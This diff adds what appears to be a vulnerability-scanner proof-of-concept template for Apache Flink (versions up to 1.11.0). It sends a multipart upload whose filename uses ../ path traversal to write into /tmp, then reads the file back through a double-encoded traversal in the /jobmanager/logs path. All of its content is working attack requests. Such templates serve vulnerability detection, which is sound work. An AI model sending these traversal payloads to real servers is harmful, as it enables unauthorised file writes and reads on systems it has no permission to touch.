@@ -1,0 +1,28 @@
+name: poc-yaml-apache-flink-file-upload
+set:
+  r1: randomInt(10000, 20000)
+rules:
+  - method: POST
+    path: /jars/upload
+    headers:
+          Content-Type: multipart/form-data;boundary=8ce4b16b22b58894aa86c421e8759df3
+    body: |-
+      --8ce4b16b22b58894aa86c421e8759df3
+      Content-Disposition: form-data; name="jarfile";filename="../../../../../../tmp/{{r1}}"
+      Content-Type:application/octet-stream
+
+      {{r1}}
+      --8ce4b16b22b58894aa86c421e8759df3--
+    expression: |
+      response.status == 400 && response.body.bcontains(b"org.apache.flink.runtime.rest.handler.RestHandlerException")
+  - method: GET
+    path: '/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252ftmp%252f{{r1}}'
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    expression: |
+      response.status == 200 && response.body.bcontains(bytes(string(r1)))
+detail:
+  author: RedTeamExp(https://github.com/RedTeamExp)
+  Affected Version: "apache filnk <= 1.11.0"
+  links:
+    - https://mp.weixin.qq.com/s?__biz=MzUzOTE2OTM5Mg==&mid=2247484465&idx=1&sn=0adab9f80e762e4a4f78966520e3d2aa
